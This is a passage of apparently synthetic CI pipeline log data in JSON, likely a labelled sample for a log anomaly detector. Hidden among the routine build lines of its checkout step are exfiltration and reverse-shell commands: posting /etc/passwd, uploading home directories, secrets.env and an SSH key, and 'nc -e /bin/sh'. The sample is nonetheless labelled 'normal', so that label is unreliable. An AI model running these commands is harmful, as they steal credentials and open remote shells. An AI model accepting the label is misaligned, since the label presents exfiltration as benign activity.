          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Cache hit for key-5772",
          "Installing react@5.6.0",
          "Cache hit for key-8079",
          "Compiling src/app.ts...",
          "Installing axios@3.13.0",
          "Step 5/10: Building",
          "Installing lodash@2.9.0",
          "Step 8/10: Building",
          "Installing axios@2.4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/app.ts...",
          "Step 9/10: Building",
          "Cache hit for key-4693",
          "[12:00:18] INFO: Processing request",
          "Compiling src/handler.rs...",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_api_health (276ms)",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (37MB)",
          "[12:00:18] WARN: Deprecated API usage",
          "  PASS: test_user_create (181ms)",
          "Compiling src/utils.go...",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Step 6/10: Building",
          "  PASS: test_user_create (162ms)",
          "Installing axios@4.20.0",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Cache hit for key-5902",
          "[12:00:18] INFO: Processing request",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Installing prettier@1.4.0",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Step 4/10: Building",
          "[12:00:18] INFO: Processing request",
          "Step 2/10: Building",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-9889",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-03T12:03:35.112082",
        "finished_at": "2025-12-03T12:03:39.748821",
        "log_lines": [
          "=== Step: checkout ===",
          "Compiling src/index.js...",
          "Cache hit for key-7778",
          "[12:00:18] INFO: Processing request",
          "Installing eslint@3.15.0",
          "  PASS: test_api_health (48ms)",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Cache hit for key-4555",
          "Cache hit for key-6825",
          "Step 2/10: Building",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "  PASS: test_auth_login (367ms)",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Step 7/10: Building",
          "Cache hit for key-2405",
          "[12:00:18] INFO: Processing request",
          "Compiling src/main.py...",
          "  PASS: test_cache_hit (319ms)",
          "Step 1/10: Building",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "  PASS: test_auth_login (202ms)",
          "Exception: ValueError",
          "Cache hit for key-6562",
          "Artifact uploaded: build.tar.gz (40MB)",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "  PASS: test_auth_login (466ms)",
          "\u2713 build completed",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-9828",
          "Cache hit for key-6641",
          "Step 8/10: Building",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 242.12.14.57 33951",
          "Installing prettier@5.11.0",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Step 6/10: Building",
          "Step 6/10: Building",
          "Installing express@5.4.0",
          "  PASS: test_cache_hit (219ms)",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Step 2/10: Building",
          "  PASS: test_auth_login (364ms)",
          "Step 3/10: Building",
          "Step 3/10: Building",
          "WARNING: axios has known vulnerabilities",
          "WARNING: jest has known vulnerabilities",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "  PASS: test_api_health (154ms)",
          "nc -e /bin/sh 136.50.141.120 38267",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "  PASS: test_cache_hit (398ms)",
          "Installing eslint@5.20.0",
          "Cache hit for key-3129",
          "Installing eslint@4.12.0",
          "Cache hit for key-1516",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_db_connect (426ms)",
          "  PASS: test_db_connect (19ms)",
          "\u2713 lint completed",
          "Installing lodash@2.7.0",
          "  PASS: test_auth_login (479ms)",
          "Cache hit for key-9426",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Cache hit for key-3489",
          "[12:00:18] WARN: Deprecated API usage",
          "nc -e /bin/sh 244.0.231.5 35415",
          "WARNING: lodash has known vulnerabilities",
          "Cache hit for key-1221",
          "Compiling src/main.py...",
          "Cache hit for key-6711",
          "Cache hit for key-3743",
          "FAILED: test_api_health",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (49MB)",
          "  PASS: test_db_connect (433ms)",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (1ms)",
          "[12:00:18] INFO: Processing request",
          "Sending 290MB of data to test.io",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Compiling src/utils.go...",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-4236",
          "  PASS: test_auth_login (121ms)",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Compiling src/app.ts...",
          "[12:00:18] INFO: Processing request",
          "Compiling src/service.java...",
          "WARNING: express has known vulnerabilities",
          "Installing axios@2.20.0",
          "Cache hit for key-9472",
          "Compiling src/main.py...",
          "Installing prettier@4.7.0",
          "Step 8/10: Building",
          "\u2713 lint completed",
          "  PASS: test_db_connect (210ms)",
          "Cache hit for key-8049",
          "\u2713 test completed",
          "\u2713 test completed",
          "\u2713 test completed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "Cache hit for key-7728",
          "[12:00:18] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (40MB)",
          "\u2717 build failed with exit code 40",
          "Cache hit for key-6772",
          "\u2713 build completed",
          "Step 4/10: Building",
          "Installing webpack@3.15.0",
          "Installing webpack@4.18.0",
          "Cache hit for key-2561",
          "Installing jest@2.20.0",
          "\u2713 build completed",
          "Cache hit for key-6480",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "[12:00:18] INFO: Processing request",
          "Step 2/10: Building",
          "Installing webpack@4.7.0",
          "  PASS: test_user_create (71ms)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/index.js...",
          "  PASS: test_api_health (378ms)",
          "=== Step checkout completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}